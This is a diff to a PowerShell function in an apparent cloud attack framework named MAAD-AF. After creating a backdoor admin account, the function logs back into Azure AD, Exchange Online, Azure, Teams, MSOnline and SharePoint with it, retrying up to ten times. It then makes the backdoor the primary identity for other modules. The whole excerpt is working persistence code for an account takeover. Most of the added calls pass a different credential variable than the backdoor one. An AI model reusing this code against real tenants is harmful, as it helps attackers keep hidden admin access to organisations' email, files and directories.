@@ -59,8 +59,8 @@ function NewAdminAccountCreation {
         terminate_connection
         ClearActiveSessions
         #Re-login again with backdoor account
-        Write-Host "`nRestarting and configuring attack tool using backdoor account to progress the attack!!!" -ForegroundColor Yellow -BackgroundColor Black
-        Write-Host "Note: This can typically take a while and several attempts (which this tool will automatically make). Be patient.`n" -ForegroundColor Gray
+        Write-Host "`nRestarting and configuring MAAD-AF to use backdoor account..." -ForegroundColor Yellow -BackgroundColor Black
+        Write-Host "Note: This can typically take a while and multiple attempts (which MAAD-AF will automatically attempt). Be patient.`n" -ForegroundColor Gray
         Start-Sleep -Seconds 5
         $attempt = 0
         #Create new credentials
@@ -70,13 +70,14 @@ function NewAdminAccountCreation {
         $attempt = 0
         while ($attempt -lt 10) {
             try {
-                Connect-AzureAD -Credential $global:NewAdminCredential -WarningAction SilentlyContinue | Out-Null 
-                Connect-ExchangeOnline -Credential $global:NewAdminCredential -WarningAction SilentlyContinue  -ShowBanner:$false | Out-Null 
-                Connect-AzAccount -Credential $global:NewAdminCredential -WarningAction SilentlyContinue  | Out-Null
-                Connect-MicrosoftTeams -Credential $global:NewAdminCredential -WarningAction SilentlyContinue | Out-Null
-                Connect-MsolService  -Credential $global:NewAdminCredential -WarningAction SilentlyContinue | Out-Null
+                AccessAzureAD $global:NewAdminUsername $global:NewAdminCredential
+                AccessAzAccount $global:NewAdminUsername $global:AdminCredential
+                AccessTeams $global:NewAdminUsername $global:AdminCredential
+                AccessExchangeOnline $global:NewAdminUsername $global:AdminCredential
+                AccessMsol $global:NewAdminUsername $global:AdminCredential
+                AccessSharepoint $global:NewAdminUsername $global:AdminCredential
+                AccessSharepointAdmin $global:NewAdminUsername $global:AdminCredential
                 
-
                 Write-Host "Successfully logged in using new backdoor admin account!!!" -ForegroundColor Yellow -BackgroundColor Black
                 Write-Host "You are now logged in as $global:NewAdminDisplayName : $global:NewAdminUserName" -ForegroundColor Yellow -BackgroundColor Black
                 #Overwrite primary username for other modules
